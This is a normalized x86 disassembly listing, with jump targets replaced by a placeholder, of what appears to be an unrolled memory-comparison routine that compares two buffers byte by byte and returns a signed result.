lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx esi [ ecx + 0xd ]
movzx eax [ edx + 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xb ]
movzx eax [ edx + 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x10 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xe ]
movzx eax [ edx + 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx esi [ ecx + 0x11 ]
movzx eax [ edx + 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xf ]
movzx eax [ edx + 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x14 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x12 ]
movzx eax [ edx + 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx esi [ ecx + 0x15 ]
movzx eax [ edx + 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x13 ]
movzx eax [ edx + 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x18 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x16 ]
movzx eax [ edx + 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
mov eax [ ecx + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx esi [ ecx + 0x19 ]
movzx eax [ edx + 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x17 ]
movzx eax [ edx + 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x1c ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x1a ]
movzx eax [ edx + 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
add ecx 0x20
add edx 0x20
sub edi 0x20
movzx esi [ ecx + 0x1d ]
movzx eax [ edx + 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1b ]
movzx eax [ edx + 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1e ]
movzx eax [ edx + 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
movzx esi [ ecx + 0x1f ]
movzx eax [ edx + 0x1f ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea esi [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
sub_41d4ce
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_41e9a2 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
